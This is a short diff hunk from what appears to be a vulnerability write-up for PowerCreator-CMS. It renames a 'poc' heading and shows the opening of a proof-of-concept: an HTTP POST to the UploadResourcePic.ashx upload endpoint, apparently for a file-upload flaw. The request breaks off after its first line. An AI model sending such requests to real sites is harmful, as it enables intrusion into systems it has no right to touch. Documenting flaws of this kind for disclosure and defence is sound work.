@@ -10,7 +10,7 @@ app="PowerCreator-CMS"
 
 ![image-20240711194543726](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407111945851.png)
 
-## poc
+## POC
 
 ```yaml
 POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
